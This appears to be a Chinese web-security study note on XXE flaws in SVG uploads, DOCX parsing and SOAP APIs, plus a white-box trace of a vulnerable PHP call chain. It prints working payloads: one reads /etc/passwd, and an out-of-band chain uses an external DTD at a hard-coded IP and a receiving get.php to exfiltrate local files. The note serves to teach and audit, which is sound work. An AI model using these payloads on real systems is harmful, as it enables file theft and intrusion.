---
title: XML&XXE&上传解析&文件预览&接口服务&白盒审计&应用功能&SRC报告
published: 2026-07-08T20:00:00
description: XXE漏洞常出现在SVG上传、DOCX解析和SOAP接口中，可利用外部实体读取文件或内网探测；黑盒主要靠功能测试和带外监控，白盒则追踪simplexml_load_string等函数调用链，无回显时用外部DTD带外读取数据。
tags:
  - Web攻防
  - XML
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-XML&XXE-黑盒功能点挖掘
2. WEB攻防-XML&XXE-白盒函数点挖掘
3. WEB攻防-XML&XXE-SRC报告

# 黑盒功能点案例

## 不安全的图像读取-SVG

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://dnslog.cn" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 不安全的文档转换-DOCX

参考地址：[https://blog.csdn.net/weixin_57567655/article/details/124588490](https://blog.csdn.net/weixin_57567655/article/details/124588490)

DOCX文档就是把一堆XML文件按照一定的格式压缩在一起，**本质上就是一个包含XML内容的压缩包**

其中比较重要的就是，内容是在document.xml文件中

如果在此xml中添加恶意代码，在一般的格式转换、提取、阅读docx内容的站点或者有类似此功能的，就会默认解析xml并执行，从而造成安全隐患

## 不安全的传递服务-SOAP

不管是上传还是文件操作，xxe影响的文件的格式后缀要知道有哪几种，[查看其他](WebSec0x17.md#见图)

在提交之后的数据包中出现`soapenv:xxxxxx`，这种就是明显的使用soap api来传递xml数据

直接在soap代码上方插入恶意代码

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

数据包内容中修改为触发方法，比如提交的是username

```
<username xsi:type="xsd:string">
	%xxe;
</username>
```

如果没回显，就先带外尝试

# 白盒函数点案例

1、漏洞函数simplexml_load_string

全局搜索代码中调用到simplexml_load_string函数的具体代码部分

2、pe_getxml函数调用了漏洞函数

发现是pe_getxml方法，使用了php://input提交，并调用了simplexml_load_string函数

```
function pe_getxml(){
	$xml = file_get_contents("php://input");
	return $xml = json_encode(json_encode(simplexml_load_string(........)))
}
```

3、wechat_getxml调用了pe_getxml

查找pe_getxml用法，发现是wechat_getxml进行了调用

4、notify_url调用了wechat_getxml

继续查找用法发现是notify_url调用了wechat_getxml，在notify_url.php脚本文件中触发了漏洞函数

最终：访问notify_url文件触发wechat_getxml函数,构造Paylod测试

先尝试读取文件，无回显后带外测试：

```
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://1uwlwv.dnslog.cn">
%file;
]>
<root>&send;</root>
```

然后带外传递数据解决无回显：

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/1.txt">
<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

test.dtd：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">
```

get.php:

```
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

# 实际复盘

https://xz.aliyun.com/news/16463

https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g

https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg

https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw